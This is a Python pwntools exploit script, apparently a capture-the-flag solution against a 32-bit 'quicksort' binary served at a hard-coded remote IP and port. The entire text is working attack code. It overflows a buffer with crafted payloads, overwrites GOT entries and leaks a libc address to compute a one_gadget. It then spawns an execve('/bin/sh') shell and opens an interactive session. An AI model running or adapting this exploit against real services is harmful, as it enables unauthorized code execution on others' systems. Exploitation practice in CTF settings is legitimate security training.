from pwn import *
context(os = 'linux',arch = 'i386', log_level = 'debug')
debug = 0
if debug == 1:
	p = process('./quicksort')
else:
	p = remote('34.92.96.238',10000)
#gdb.attach(p)

p.recvuntil('to sort?')
p.sendline('5')


payload = ''
payload += '1' * 16
payload += p32(0x11111111)
payload += p32(0xFFFFFFFF)
payload += p32(0xFFFFFFFF)
payload += p32(0x0804A008)
payload += 'B' * 20
payload += p32(0x08048816)

p.recvuntil(' number:')
p.sendline(payload)

p.recvuntil(' number:')
p.sendline('134514710' + 'A' * 11 + '\x04')

p.recvuntil(' number:')
p.sendline('134514710' + 'A' * 11 + '\x0d')

p.recvuntil(' number:')
p.sendline('134514710' + 'A' * 7 + '\x07\x07\x07')

p.recvuntil(' number:')
p.sendline('134514710' + 'A' * 7 + '\x07\x07')

p.recvuntil(' number:')
p.sendline('134514710' + 'A' * 7 + '\x02')

p.recvline()
setbuf = int(p.recvline()[:10],10)
one_gadget = setbuf - 0x65ff0 + 0x3ac62
print str(one_gadget)
print hex(one_gadget & 0xffffffff)
print hex((setbuf - 0x65ff0) & 0xffffffff)
'''
0x3ac5c execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL

'''
p.recvuntil('to sort?')
p.sendline('5')
p.recvuntil(' number:')
p.sendline(payload)

p.recvuntil(' number:')
p.sendline(str(one_gadget) + 'A' * 10 + '\x04')

p.recvuntil(' number:')
p.sendline('134514710' + 'A' * 11 + '\x0d')

p.recvuntil(' number:')
p.sendline('134514710' + 'A' * 7 + '\x07\x07\x07')

p.recvuntil(' number:')
p.sendline('134514710' + 'A' * 7 + '\x07\x07')

p.recvuntil(' number:')
p.sendline('134514710' + 'A' * 7 + '\x00')


p.interactive()
